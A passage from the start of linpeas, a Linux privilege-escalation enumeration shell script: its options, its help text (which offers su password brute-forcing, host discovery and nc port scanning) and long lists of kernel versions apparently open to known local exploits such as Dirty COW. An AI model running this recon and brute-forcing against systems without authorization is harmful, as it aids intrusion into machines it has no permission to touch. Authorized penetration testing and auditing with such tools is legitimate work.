#!/bin/sh

VERSION="v2.6.6"
ADVISORY="linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."


###########################################
#-------) Checks pre-everything (---------#
###########################################
if [ "$(/usr/bin/id -u)" -eq "0" ]; then
  IAMROOT="1"
  MAXPATH_FIND_W="3"
else
  IAMROOT=""
  MAXPATH_FIND_W="7"
fi


########################################### 
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
Y="${C}[1;33m"
B="${C}[1;34m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"


###########################################
#---------) Parsing parameters (----------#
###########################################
# --) FAST - Do not check 1min of procceses and su brute
# --) SUPERFAST - FAST & do not search for special filaes in all the folders

FAST="1" #By default stealth/fast mode
SUPERFAST=""
NOTEXPORT=""
DISCOVERY=""
PORTS=""
QUIET=""
CHECKS="SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks,Net,UsrI,SofI,IntFiles"
WAIT=""
HELP=$GREEN"Enumerate and search Privilege Escalation vectors.
      $B This tool enum and search possible misconfigurations$DG (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...)$B inside the host and highlight possible misconfigs with colors.
      $Y-h$B To show this message
      $Y-q$B Do not show banner
      $Y-a$B All checks (1min of processes and su brute) - Noisy mode, for CTFs mainly
      $Y-s$B SuperFast (don't check some time consuming checks) - Stealth mode
      $Y-w$B Wait execution between big blocks
      $Y-n$B Do not export env variables related with history
      $Y-o$B Only execute selected checks (SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles). Select a comma separated list.
      $Y-d <IP/NETMASK>$B Discover hosts using fping or ping.$DG Ex: -d 192.168.0.1/24
      $Y-p <PORT(s)> -d <IP/NETMASK>$B Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports.$DG Ex: -d 192.168.0.1/24 -p 53,139
      $Y-i <IP> [-p <PORT(s)>]$B Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead.$DG Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
      $GREEN Notice$B that if you select some network action, no PE check will be performed\n\n"

while getopts "h?asd:p:i:qo:w" opt; do
  case "$opt" in
    h|\?) printf "$HELP"$NC; exit 0;;
    a)  FAST="";;
    s)  SUPERFAST=1;;
    n)  NOTEXPORT=1;;
    d)  DISCOVERY=$OPTARG;;
    p)  PORTS=$OPTARG;;
    i)  IP=$OPTARG;;
    q)  QUIET=1;;
    o)  CHECKS=$OPTARG;;
    w)  WAIT=1;;
    esac
done


###########################################
#---------------) Lists (-----------------#
###########################################

filename="linpeas.txt$RANDOM"
kernelB=" 4.0\.[0-9]\+\| 4.1\.[0-9]\+\| 4.2\.[0-9]\+\| 4.3\.[0-9]\+\| 4.4\.[0-9]\+\| 4.5\.[0-9]\+\| 4.6\.[0-9]\+\| 4.7\.[0-9]\+\| 4.8\.[0-9]\+\| 4.9\.[0-9]\+\| 4.10.[0-9]\+\| 4.11.[0-9]\+\| 4.12.[0-9]\+\| 4.13.[0-9]\+\| 3.9.6\| 3.9.0\| 3.9\| 3.8.9\| 3.8.8\| 3.8.7\| 3.8.6\| 3.8.5\| 3.8.4\| 3.8.3\| 3.8.2\| 3.8.1\| 3.8.0\| 3.8\| 3.7.6\| 3.7.0\| 3.7\| 3.6.0\| 3.6\| 3.5.0\| 3.5\| 3.4.9\| 3.4.8\| 3.4.6\| 3.4.5\| 3.4.4\| 3.4.3\| 3.4.2\| 3.4.1\| 3.4.0\| 3.4\| 3.3\| 3.2\| 3.19.0\| 3.16.0\| 3.15\| 3.14\| 3.13.1\| 3.13.0\| 3.13\| 3.12.0\| 3.12\| 3.11.0\| 3.11\| 3.10.6\| 3.10.0\| 3.10\| 3.1.0\| 3.0.6\| 3.0.5\| 3.0.4\| 3.0.3\| 3.0.2\| 3.0.1\| 3.0.0\| 2.6.9\| 2.6.8\| 2.6.7\| 2.6.6\| 2.6.5\| 2.6.4\| 2.6.39\| 2.6.38\| 2.6.37\| 2.6.36\| 2.6.35\| 2.6.34\| 2.6.33\| 2.6.32\| 2.6.31\| 2.6.30\| 2.6.3\| 2.6.29\| 2.6.28\| 2.6.27\| 2.6.26\| 2.6.25\| 2.6.24.1\| 2.6.24\| 2.6.23\| 2.6.22\| 2.6.21\| 2.6.20\| 2.6.2\| 2.6.19\| 2.6.18\| 2.6.17\| 2.6.16\| 2.6.15\| 2.6.14\| 2.6.13\| 2.6.12\| 2.6.11\| 2.6.10\| 2.6.1\| 2.6.0\| 2.4.9\| 2.4.8\| 2.4.7\| 2.4.6\| 2.4.5\| 2.4.4\| 2.4.37\| 2.4.36\| 2.4.35\| 2.4.34\| 2.4.33\| 2.4.32\| 2.4.31\| 2.4.30\| 2.4.29\| 2.4.28\| 2.4.27\| 2.4.26\| 2.4.25\| 2.4.24\| 2.4.23\| 2.4.22\| 2.4.21\| 2.4.20\| 2.4.19\| 2.4.18\| 2.4.17\| 2.4.16\| 2.4.15\| 2.4.14\| 2.4.13\| 2.4.12\| 2.4.11\| 2.4.10\| 2.2.24"
kernelDCW_Ubuntu_Precise_1="3.1.1-1400-linaro-lt-mx5\|3.11.0-13-generic\|3.11.0-14-generic\|3.11.0-15-generic\|3.11.0-17-generic\|3.11.0-18-generic\|3.11.0-20-generic\|3.11.0-22-generic\|3.11.0-23-generic\|3.11.0-24-generic\|3.11.0-26-generic\|3.13.0-100-generic\|3.13.0-24-generic\|3.13.0-27-generic\|3.13.0-29-generic\|3.13.0-30-generic\|3.13.0-32-generic\|3.13.0-33-generic\|3.13.0-34-generic\|3.13.0-35-generic\|3.13.0-36-generic\|3.13.0-37-generic\|3.13.0-39-generic\|3.13.0-40-generic\|3.13.0-41-generic\|3.13.0-43-generic\|3.13.0-44-generic\|3.13.0-46-generic\|3.13.0-48-generic\|3.13.0-49-generic\|3.13.0-51-generic\|3.13.0-52-generic\|3.13.0-53-generic\|3.13.0-54-generic\|3.13.0-55-generic\|3.13.0-57-generic\|3.13.0-58-generic\|3.13.0-59-generic\|3.13.0-61-generic\|3.13.0-62-generic\|3.13.0-63-generic\|3.13.0-65-generic\|3.13.0-66-generic\|3.13.0-67-generic\|3.13.0-68-generic\|3.13.0-71-generic\|3.13.0-73-generic\|3.13.0-74-generic\|3.13.0-76-generic\|3.13.0-77-generic\|3.13.0-79-generic\|3.13.0-83-generic\|3.13.0-85-generic\|3.13.0-86-generic\|3.13.0-88-generic\|3.13.0-91-generic\|3.13.0-92-generic\|3.13.0-93-generic\|3.13.0-95-generic\|3.13.0-96-generic\|3.13.0-98-generic\|3.2.0-101-generic\|3.2.0-101-generic-pae\|3.2.0-101-virtual\|3.2.0-102-generic\|3.2.0-102-generic-pae\|3.2.0-102-virtual\|3.2.0-104-generic\|3.2.0-104-generic-pae\|3.2.0-104-virtual\|3.2.0-105-generic\|3.2.0-105-generic-pae\|3.2.0-105-virtual\|3.2.0-106-generic\|3.2.0-106-generic-pae\|3.2.0-106-virtual\|3.2.0-107-generic\|3.2.0-107-generic-pae\|3.2.0-107-virtual\|3.2.0-109-generic\|3.2.0-109-generic-pae\|3.2.0-109-virtual\|3.2.0-110-generic\|3.2.0-110-generic-pae\|3.2.0-110-virtual\|3.2.0-111-generic\|3.2.0-111-generic-pae\|3.2.0-111-virtual\|3.2.0-1412-omap4\|3.2.0-1602-armadaxp\|3.2.0-23-generic\|3.2.0-23-generic-pae\|3.2.0-23-lowlatency\|3.2.0-23-lowlatency-pae\|3.2.0-23-omap\|3.2.0-23-powerpc-smp\|3.2.0-23-powerpc64-smp\|3.2.0-23-virtual\|3.2.0-24-generic\|3.2.0-24-generic-pae\|3.2.0-24-virtual\|3.2.0-25-generic\|3.2.0-25-generic-pae\|3.2.0-25-virtual\|3.2.0-26-generic\|3.2.0-26-generic-pae\|3.2.0-26-virtual\|3.2.0-27-generic\|3.2.0-27-generic-pae\|3.2.0-27-virtual\|3.2.0-29-generic\|3.2.0-29-generic-pae\|3.2.0-29-virtual\|3.2.0-31-generic\|3.2.0-31-generic-pae\|3.2.0-31-virtual\|3.2.0-32-generic\|3.2.0-32-generic-pae\|3.2.0-32-virtual\|3.2.0-33-generic\|3.2.0-33-generic-pae\|3.2.0-33-lowlatency\|3.2.0-33-lowlatency-pae\|3.2.0-33-virtual\|3.2.0-34-generic\|3.2.0-34-generic-pae\|3.2.0-34-virtual\|3.2.0-35-generic\|3.2.0-35-generic-pae\|3.2.0-35-lowlatency\|3.2.0-35-lowlatency-pae\|3.2.0-35-virtual\|3.2.0-36-generic\|3.2.0-36-generic-pae\|3.2.0-36-lowlatency\|3.2.0-36-lowlatency-pae\|3.2.0-36-virtual\|3.2.0-37-generic\|3.2.0-37-generic-pae\|3.2.0-37-lowlatency\|3.2.0-37-lowlatency-pae\|3.2.0-37-virtual\|3.2.0-38-generic\|3.2.0-38-generic-pae\|3.2.0-38-lowlatency\|3.2.0-38-lowlatency-pae\|3.2.0-38-virtual\|3.2.0-39-generic\|3.2.0-39-generic-pae\|3.2.0-39-lowlatency\|3.2.0-39-lowlatency-pae\|3.2.0-39-virtual\|3.2.0-40-generic\|3.2.0-40-generic-pae\|3.2.0-40-lowlatency\|3.2.0-40-lowlatency-pae\|3.2.0-40-virtual\|3.2.0-41-generic\|3.2.0-41-generic-pae\|3.2.0-41-lowlatency\|3.2.0-41-lowlatency-pae\|3.2.0-41-virtual\|3.2.0-43-generic\|3.2.0-43-generic-pae\|3.2.0-43-virtual\|3.2.0-44-generic\|3.2.0-44-generic-pae\|3.2.0-44-lowlatency\|3.2.0-44-lowlatency-pae\|3.2.0-44-virtual\|3.2.0-45-generic\|3.2.0-45-generic-pae\|3.2.0-45-virtual\|3.2.0-48-generic\|3.2.0-48-generic-pae\|3.2.0-48-lowlatency\|3.2.0-48-lowlatency-pae\|3.2.0-48-virtual\|3.2.0-51-generic\|3.2.0-51-generic-pae\|3.2.0-51-lowlatency\|3.2.0-51-lowlatency-pae\|3.2.0-51-virtual\|3.2.0-52-generic\|3.2.0-52-generic-pae\|3.2.0-52-lowlatency\|3.2.0-52-lowlatency-pae\|3.2.0-52-virtual\|3.2.0-53-generic"
kernelDCW_Ubuntu_Precise_2="3.2.0-53-generic-pae\|3.2.0-53-lowlatency\|3.2.0-53-lowlatency-pae\|3.2.0-53-virtual\|3.2.0-54-generic\|3.2.0-54-generic-pae\|3.2.0-54-lowlatency\|3.2.0-54-lowlatency-pae\|3.2.0-54-virtual\|3.2.0-55-generic\|3.2.0-55-generic-pae\|3.2.0-55-lowlatency\|3.2.0-55-lowlatency-pae\|3.2.0-55-virtual\|3.2.0-56-generic\|3.2.0-56-generic-pae\|3.2.0-56-lowlatency\|3.2.0-56-lowlatency-pae\|3.2.0-56-virtual\|3.2.0-57-generic\|3.2.0-57-generic-pae\|3.2.0-57-lowlatency\|3.2.0-57-lowlatency-pae\|3.2.0-57-virtual\|3.2.0-58-generic\|3.2.0-58-generic-pae\|3.2.0-58-lowlatency\|3.2.0-58-lowlatency-pae\|3.2.0-58-virtual\|3.2.0-59-generic\|3.2.0-59-generic-pae\|3.2.0-59-lowlatency\|3.2.0-59-lowlatency-pae\|3.2.0-59-virtual\|3.2.0-60-generic\|3.2.0-60-generic-pae\|3.2.0-60-lowlatency\|3.2.0-60-lowlatency-pae\|3.2.0-60-virtual\|3.2.0-61-generic\|3.2.0-61-generic-pae\|3.2.0-61-virtual\|3.2.0-63-generic\|3.2.0-63-generic-pae\|3.2.0-63-lowlatency\|3.2.0-63-lowlatency-pae\|3.2.0-63-virtual\|3.2.0-64-generic\|3.2.0-64-generic-pae\|3.2.0-64-lowlatency\|3.2.0-64-lowlatency-pae\|3.2.0-64-virtual\|3.2.0-65-generic\|3.2.0-65-generic-pae\|3.2.0-65-lowlatency\|3.2.0-65-lowlatency-pae\|3.2.0-65-virtual\|3.2.0-67-generic\|3.2.0-67-generic-pae\|3.2.0-67-lowlatency\|3.2.0-67-lowlatency-pae\|3.2.0-67-virtual\|3.2.0-68-generic\|3.2.0-68-generic-pae\|3.2.0-68-lowlatency\|3.2.0-68-lowlatency-pae\|3.2.0-68-virtual\|3.2.0-69-generic\|3.2.0-69-generic-pae\|3.2.0-69-lowlatency\|3.2.0-69-lowlatency-pae\|3.2.0-69-virtual\|3.2.0-70-generic\|3.2.0-70-generic-pae\|3.2.0-70-lowlatency\|3.2.0-70-lowlatency-pae\|3.2.0-70-virtual\|3.2.0-72-generic\|3.2.0-72-generic-pae\|3.2.0-72-lowlatency\|3.2.0-72-lowlatency-pae\|3.2.0-72-virtual\|3.2.0-73-generic\|3.2.0-73-generic-pae\|3.2.0-73-lowlatency\|3.2.0-73-lowlatency-pae\|3.2.0-73-virtual\|3.2.0-74-generic\|3.2.0-74-generic-pae\|3.2.0-74-lowlatency\|3.2.0-74-lowlatency-pae\|3.2.0-74-virtual\|3.2.0-75-generic\|3.2.0-75-generic-pae\|3.2.0-75-lowlatency\|3.2.0-75-lowlatency-pae\|3.2.0-75-virtual\|3.2.0-76-generic\|3.2.0-76-generic-pae\|3.2.0-76-lowlatency\|3.2.0-76-lowlatency-pae\|3.2.0-76-virtual\|3.2.0-77-generic\|3.2.0-77-generic-pae\|3.2.0-77-lowlatency\|3.2.0-77-lowlatency-pae\|3.2.0-77-virtual\|3.2.0-79-generic\|3.2.0-79-generic-pae\|3.2.0-79-lowlatency\|3.2.0-79-lowlatency-pae\|3.2.0-79-virtual\|3.2.0-80-generic\|3.2.0-80-generic-pae\|3.2.0-80-lowlatency\|3.2.0-80-lowlatency-pae\|3.2.0-80-virtual\|3.2.0-82-generic\|3.2.0-82-generic-pae\|3.2.0-82-lowlatency\|3.2.0-82-lowlatency-pae\|3.2.0-82-virtual\|3.2.0-83-generic\|3.2.0-83-generic-pae\|3.2.0-83-virtual\|3.2.0-84-generic\|3.2.0-84-generic-pae\|3.2.0-84-virtual\|3.2.0-85-generic\|3.2.0-85-generic-pae\|3.2.0-85-virtual\|3.2.0-86-generic\|3.2.0-86-generic-pae\|3.2.0-86-virtual\|3.2.0-87-generic\|3.2.0-87-generic-pae\|3.2.0-87-virtual\|3.2.0-88-generic\|3.2.0-88-generic-pae\|3.2.0-88-virtual\|3.2.0-89-generic\|3.2.0-89-generic-pae\|3.2.0-89-virtual\|3.2.0-90-generic\|3.2.0-90-generic-pae\|3.2.0-90-virtual\|3.2.0-91-generic\|3.2.0-91-generic-pae\|3.2.0-91-virtual\|3.2.0-92-generic\|3.2.0-92-generic-pae\|3.2.0-92-virtual\|3.2.0-93-generic\|3.2.0-93-generic-pae\|3.2.0-93-virtual\|3.2.0-94-generic\|3.2.0-94-generic-pae\|3.2.0-94-virtual\|3.2.0-95-generic\|3.2.0-95-generic-pae\|3.2.0-95-virtual\|3.2.0-96-generic\|3.2.0-96-generic-pae\|3.2.0-96-virtual\|3.2.0-97-generic\|3.2.0-97-generic-pae\|3.2.0-97-virtual\|3.2.0-98-generic\|3.2.0-98-generic-pae\|3.2.0-98-virtual\|3.2.0-99-generic\|3.2.0-99-generic-pae\|3.2.0-99-virtual\|3.5.0-40-generic\|3.5.0-41-generic\|3.5.0-42-generic\|3.5.0-43-generic\|3.5.0-44-generic\|3.5.0-45-generic\|3.5.0-46-generic\|3.5.0-49-generic\|3.5.0-51-generic\|3.5.0-52-generic\|3.5.0-54-generic\|3.8.0-19-generic\|3.8.0-21-generic\|3.8.0-22-generic\|3.8.0-23-generic\|3.8.0-27-generic\|3.8.0-29-generic\|3.8.0-30-generic\|3.8.0-31-generic\|3.8.0-32-generic\|3.8.0-33-generic\|3.8.0-34-generic\|3.8.0-35-generic\|3.8.0-36-generic\|3.8.0-37-generic\|3.8.0-38-generic\|3.8.0-39-generic\|3.8.0-41-generic\|3.8.0-42-generic"
kernelDCW_Ubuntu_Trusty_1="3.13.0-24-generic\|3.13.0-24-generic-lpae\|3.13.0-24-lowlatency\|3.13.0-24-powerpc-e500\|3.13.0-24-powerpc-e500mc\|3.13.0-24-powerpc-smp\|3.13.0-24-powerpc64-emb\|3.13.0-24-powerpc64-smp\|3.13.0-27-generic\|3.13.0-27-lowlatency\|3.13.0-29-generic\|3.13.0-29-lowlatency\|3.13.0-3-exynos5\|3.13.0-30-generic\|3.13.0-30-lowlatency\|3.13.0-32-generic\|3.13.0-32-lowlatency\|3.13.0-33-generic\|3.13.0-33-lowlatency\|3.13.0-34-generic\|3.13.0-34-lowlatency\|3.13.0-35-generic\|3.13.0-35-lowlatency\|3.13.0-36-generic\|3.13.0-36-lowlatency\|3.13.0-37-generic\|3.13.0-37-lowlatency\|3.13.0-39-generic\|3.13.0-39-lowlatency\|3.13.0-40-generic\|3.13.0-40-lowlatency\|3.13.0-41-generic\|3.13.0-41-lowlatency\|3.13.0-43-generic\|3.13.0-43-lowlatency\|3.13.0-44-generic\|3.13.0-44-lowlatency\|3.13.0-46-generic\|3.13.0-46-lowlatency\|3.13.0-48-generic\|3.13.0-48-lowlatency\|3.13.0-49-generic\|3.13.0-49-lowlatency\|3.13.0-51-generic\|3.13.0-51-lowlatency\|3.13.0-52-generic\|3.13.0-52-lowlatency\|3.13.0-53-generic\|3.13.0-53-lowlatency\|3.13.0-54-generic\|3.13.0-54-lowlatency\|3.13.0-55-generic\|3.13.0-55-lowlatency\|3.13.0-57-generic\|3.13.0-57-lowlatency\|3.13.0-58-generic\|3.13.0-58-lowlatency\|3.13.0-59-generic\|3.13.0-59-lowlatency\|3.13.0-61-generic\|3.13.0-61-lowlatency\|3.13.0-62-generic\|3.13.0-62-lowlatency\|3.13.0-63-generic\|3.13.0-63-lowlatency\|3.13.0-65-generic\|3.13.0-65-lowlatency\|3.13.0-66-generic\|3.13.0-66-lowlatency\|3.13.0-67-generic\|3.13.0-67-lowlatency\|3.13.0-68-generic\|3.13.0-68-lowlatency\|3.13.0-70-generic\|3.13.0-70-lowlatency\|3.13.0-71-generic\|3.13.0-71-lowlatency\|3.13.0-73-generic\|3.13.0-73-lowlatency\|3.13.0-74-generic\|3.13.0-74-lowlatency\|3.13.0-76-generic\|3.13.0-76-lowlatency\|3.13.0-77-generic\|3.13.0-77-lowlatency\|3.13.0-79-generic\|3.13.0-79-lowlatency\|3.13.0-83-generic\|3.13.0-83-lowlatency\|3.13.0-85-generic\|3.13.0-85-lowlatency\|3.13.0-86-generic\|3.13.0-86-lowlatency\|3.13.0-87-generic\|3.13.0-87-lowlatency\|3.13.0-88-generic\|3.13.0-88-lowlatency\|3.13.0-91-generic\|3.13.0-91-lowlatency\|3.13.0-92-generic\|3.13.0-92-lowlatency\|3.13.0-93-generic\|3.13.0-93-lowlatency\|3.13.0-95-generic\|3.13.0-95-lowlatency\|3.13.0-96-generic\|3.13.0-96-lowlatency\|3.13.0-98-generic\|3.13.0-98-lowlatency\|3.16.0-25-generic\|3.16.0-25-lowlatency\|3.16.0-26-generic\|3.16.0-26-lowlatency\|3.16.0-28-generic\|3.16.0-28-lowlatency\|3.16.0-29-generic\|3.16.0-29-lowlatency\|3.16.0-31-generic\|3.16.0-31-lowlatency\|3.16.0-33-generic\|3.16.0-33-lowlatency\|3.16.0-34-generic\|3.16.0-34-lowlatency\|3.16.0-36-generic\|3.16.0-36-lowlatency\|3.16.0-37-generic\|3.16.0-37-lowlatency\|3.16.0-38-generic\|3.16.0-38-lowlatency\|3.16.0-39-generic\|3.16.0-39-lowlatency\|3.16.0-41-generic\|3.16.0-41-lowlatency\|3.16.0-43-generic\|3.16.0-43-lowlatency\|3.16.0-44-generic\|3.16.0-44-lowlatency\|3.16.0-45-generic"
kernelDCW_Ubuntu_Trusty_2="3.16.0-45-lowlatency\|3.16.0-46-generic\|3.16.0-46-lowlatency\|3.16.0-48-generic\|3.16.0-48-lowlatency\|3.16.0-49-generic\|3.16.0-49-lowlatency\|3.16.0-50-generic\|3.16.0-50-lowlatency\|3.16.0-51-generic\|3.16.0-51-lowlatency\|3.16.0-52-generic\|3.16.0-52-lowlatency\|3.16.0-53-generic\|3.16.0-53-lowlatency\|3.16.0-55-generic\|3.16.0-55-lowlatency\|3.16.0-56-generic\|3.16.0-56-lowlatency\|3.16.0-57-generic\|3.16.0-57-lowlatency\|3.16.0-59-generic\|3.16.0-59-lowlatency\|3.16.0-60-generic\|3.16.0-60-lowlatency\|3.16.0-62-generic\|3.16.0-62-lowlatency\|3.16.0-67-generic\|3.16.0-67-lowlatency\|3.16.0-69-generic\|3.16.0-69-lowlatency\|3.16.0-70-generic\|3.16.0-70-lowlatency\|3.16.0-71-generic\|3.16.0-71-lowlatency\|3.16.0-73-generic\|3.16.0-73-lowlatency\|3.16.0-76-generic\|3.16.0-76-lowlatency\|3.16.0-77-generic\|3.16.0-77-lowlatency\|3.19.0-20-generic\|3.19.0-20-lowlatency\|3.19.0-21-generic\|3.19.0-21-lowlatency\|3.19.0-22-generic\|3.19.0-22-lowlatency\|3.19.0-23-generic\|3.19.0-23-lowlatency\|3.19.0-25-generic\|3.19.0-25-lowlatency\|3.19.0-26-generic\|3.19.0-26-lowlatency\|3.19.0-28-generic\|3.19.0-28-lowlatency\|3.19.0-30-generic\|3.19.0-30-lowlatency\|3.19.0-31-generic\|3.19.0-31-lowlatency\|3.19.0-32-generic\|3.19.0-32-lowlatency\|3.19.0-33-generic\|3.19.0-33-lowlatency\|3.19.0-37-generic\|3.19.0-37-lowlatency\|3.19.0-39-generic\|3.19.0-39-lowlatency\|3.19.0-41-generic\|3.19.0-41-lowlatency\|3.19.0-42-generic\|3.19.0-42-lowlatency\|3.19.0-43-generic\|3.19.0-43-lowlatency\|3.19.0-47-generic\|3.19.0-47-lowlatency\|3.19.0-49-generic\|3.19.0-49-lowlatency\|3.19.0-51-generic\|3.19.0-51-lowlatency\|3.19.0-56-generic\|3.19.0-56-lowlatency\|3.19.0-58-generic\|3.19.0-58-lowlatency\|3.19.0-59-generic\|3.19.0-59-lowlatency\|3.19.0-61-generic\|3.19.0-61-lowlatency\|3.19.0-64-generic\|3.19.0-64-lowlatency\|3.19.0-65-generic\|3.19.0-65-lowlatency\|3.19.0-66-generic\|3.19.0-66-lowlatency\|3.19.0-68-generic\|3.19.0-68-lowlatency\|3.19.0-69-generic\|3.19.0-69-lowlatency\|3.19.0-71-generic\|3.19.0-71-lowlatency\|3.4.0-5-chromebook\|4.2.0-18-generic\|4.2.0-18-lowlatency\|4.2.0-19-generic\|4.2.0-19-lowlatency\|4.2.0-21-generic\|4.2.0-21-lowlatency\|4.2.0-22-generic\|4.2.0-22-lowlatency\|4.2.0-23-generic\|4.2.0-23-lowlatency\|4.2.0-25-generic\|4.2.0-25-lowlatency\|4.2.0-27-generic\|4.2.0-27-lowlatency\|4.2.0-30-generic\|4.2.0-30-lowlatency\|4.2.0-34-generic\|4.2.0-34-lowlatency\|4.2.0-35-generic\|4.2.0-35-lowlatency\|4.2.0-36-generic\|4.2.0-36-lowlatency\|4.2.0-38-generic\|4.2.0-38-lowlatency\|4.2.0-41-generic\|4.2.0-41-lowlatency\|4.4.0-21-generic\|4.4.0-21-lowlatency\|4.4.0-22-generic\|4.4.0-22-lowlatency\|4.4.0-24-generic\|4.4.0-24-lowlatency\|4.4.0-28-generic\|4.4.0-28-lowlatency\|4.4.0-31-generic\|4.4.0-31-lowlatency\|4.4.0-34-generic\|4.4.0-34-lowlatency\|4.4.0-36-generic\|4.4.0-36-lowlatency\|4.4.0-38-generic\|4.4.0-38-lowlatency\|4.4.0-42-generic\|4.4.0-42-lowlatency"
kernelDCW_Ubuntu_Xenial="4.4.0-1009-raspi2\|4.4.0-1012-snapdragon\|4.4.0-21-generic\|4.4.0-21-generic-lpae\|4.4.0-21-lowlatency\|4.4.0-21-powerpc-e500mc\|4.4.0-21-powerpc-smp\|4.4.0-21-powerpc64-emb\|4.4.0-21-powerpc64-smp\|4.4.0-22-generic\|4.4.0-22-lowlatency\|4.4.0-24-generic\|4.4.0-24-lowlatency\|4.4.0-28-generic\|4.4.0-28-lowlatency\|4.4.0-31-generic\|4.4.0-31-lowlatency\|4.4.0-34-generic\|4.4.0-34-lowlatency\|4.4.0-36-generic\|4.4.0-36-lowlatency\|4.4.0-38-generic\|4.4.0-38-lowlatency\|4.4.0-42-generic\|4.4.0-42-lowlatency"
kernelDCW_Rhel5="2.6.24.7-74.el5rt\|2.6.24.7-81.el5rt\|2.6.24.7-93.el5rt\|2.6.24.7-101.el5rt\|2.6.24.7-108.el5rt\|2.6.24.7-111.el5rt\|2.6.24.7-117.el5rt\|2.6.24.7-126.el5rt\|2.6.24.7-132.el5rt\|2.6.24.7-137.el5rt\|2.6.24.7-139.el5rt\|2.6.24.7-146.el5rt\|2.6.24.7-149.el5rt\|2.6.24.7-161.el5rt\|2.6.24.7-169.el5rt\|2.6.33.7-rt29.45.el5rt\|2.6.33.7-rt29.47.el5rt\|2.6.33.7-rt29.55.el5rt\|2.6.33.9-rt31.64.el5rt\|2.6.33.9-rt31.67.el5rt\|2.6.33.9-rt31.86.el5rt\|2.6.18-8.1.1.el5\|2.6.18-8.1.3.el5\|2.6.18-8.1.4.el5\|2.6.18-8.1.6.el5\|2.6.18-8.1.8.el5\|2.6.18-8.1.10.el5\|2.6.18-8.1.14.el5\|2.6.18-8.1.15.el5\|2.6.18-53.el5\|2.6.18-53.1.4.el5\|2.6.18-53.1.6.el5\|2.6.18-53.1.13.el5\|2.6.18-53.1.14.el5\|2.6.18-53.1.19.el5\|2.6.18-53.1.21.el5\|2.6.18-92.el5\|2.6.18-92.1.1.el5\|2.6.18-92.1.6.el5\|2.6.18-92.1.10.el5\|2.6.18-92.1.13.el5\|2.6.18-92.1.18.el5\|2.6.18-92.1.22.el5\|2.6.18-92.1.24.el5\|2.6.18-92.1.26.el5\|2.6.18-92.1.27.el5\|2.6.18-92.1.28.el5\|2.6.18-92.1.29.el5\|2.6.18-92.1.32.el5\|2.6.18-92.1.35.el5\|2.6.18-92.1.38.el5\|2.6.18-128.el5\|2.6.18-128.1.1.el5\|2.6.18-128.1.6.el5\|2.6.18-128.1.10.el5\|2.6.18-128.1.14.el5\|2.6.18-128.1.16.el5\|2.6.18-128.2.1.el5\|2.6.18-128.4.1.el5\|2.6.18-128.4.1.el5\|2.6.18-128.7.1.el5\|2.6.18-128.8.1.el5\|2.6.18-128.11.1.el5\|2.6.18-128.12.1.el5\|2.6.18-128.14.1.el5\|2.6.18-128.16.1.el5\|2.6.18-128.17.1.el5\|2.6.18-128.18.1.el5\|2.6.18-128.23.1.el5\|2.6.18-128.23.2.el5\|2.6.18-128.25.1.el5\|2.6.18-128.26.1.el5\|2.6.18-128.27.1.el5\|2.6.18-128.29.1.el5\|2.6.18-128.30.1.el5\|2.6.18-128.31.1.el5\|2.6.18-128.32.1.el5\|2.6.18-128.35.1.el5\|2.6.18-128.36.1.el5\|2.6.18-128.37.1.el5\|2.6.18-128.38.1.el5\|2.6.18-128.39.1.el5\|2.6.18-128.40.1.el5\|2.6.18-128.41.1.el5\|2.6.18-164.el5\|2.6.18-164.2.1.el5\|2.6.18-164.6.1.el5\|2.6.18-164.9.1.el5\|2.6.18-164.10.1.el5\|2.6.18-164.11.1.el5\|2.6.18-164.15.1.el5\|2.6.18-164.17.1.el5\|2.6.18-164.19.1.el5\|2.6.18-164.21.1.el5\|2.6.18-164.25.1.el5\|2.6.18-164.25.2.el5\|2.6.18-164.28.1.el5\|2.6.18-164.30.1.el5\|2.6.18-164.32.1.el5\|2.6.18-164.34.1.el5\|2.6.18-164.36.1.el5\|2.6.18-164.37.1.el5\|2.6.18-164.38.1.el5\|2.6.18-194.el5\|2.6.18-194.3.1.el5\|2.6.18-194.8.1.el5\|2.6.18-194.11.1.el5\|2.6.18-194.11.3.el5\|2.6.18-194.11.4.el5\|2.6.18-194.17.1.el5\|2.6.18-194.17.4.el5\|2.6.18-194.26.1.el5\|2.6.18-194.32.1.el5\|2.6.18-238.el5\|2.6.18-238.1.1.el5\|2.6.18-238.5.1.el5\|2.6.18-238.9.1.el5\|2.6.18-238.12.1.el5\|2.6.18-238.19.1.el5\|2.6.18-238.21.1.el5\|2.6.18-238.27.1.el5\|2.6.18-238.28.1.el5\|2.6.18-238.31.1.el5\|2.6.18-238.33.1.el5\|2.6.18-238.35.1.el5\|2.6.18-238.37.1.el5\|2.6.18-238.39.1.el5\|2.6.18-238.40.1.el5\|2.6.18-238.44.1.el5\|2.6.18-238.45.1.el5\|2.6.18-238.47.1.el5\|2.6.18-238.48.1.el5\|2.6.18-238.49.1.el5\|2.6.18-238.50.1.el5\|2.6.18-238.51.1.el5\|2.6.18-238.52.1.el5\|2.6.18-238.53.1.el5\|2.6.18-238.54.1.el5\|2.6.18-238.55.1.el5\|2.6.18-238.56.1.el5\|2.6.18-274.el5\|2.6.18-274.3.1.el5\|2.6.18-274.7.1.el5\|2.6.18-274.12.1.el5\|2.6.18-274.17.1.el5\|2.6.18-274.18.1.el5\|2.6.18-308.el5\|2.6.18-308.1.1.el5\|2.6.18-308.4.1.el5\|2.6.18-308.8.1.el5\|2.6.18-308.8.2.el5\|2.6.18-308.11.1.el5\|2.6.18-308.13.1.el5\|2.6.18-308.16.1.el5\|2.6.18-308.20.1.el5\|2.6.18-308.24.1.el5\|2.6.18-348.el5\|2.6.18-348.1.1.el5\|2.6.18-348.2.1.el5\|2.6.18-348.3.1.el5\|2.6.18-348.4.1.el5\|2.6.18-348.6.1.el5\|2.6.18-348.12.1.el5\|2.6.18-348.16.1.el5\|2.6.18-348.1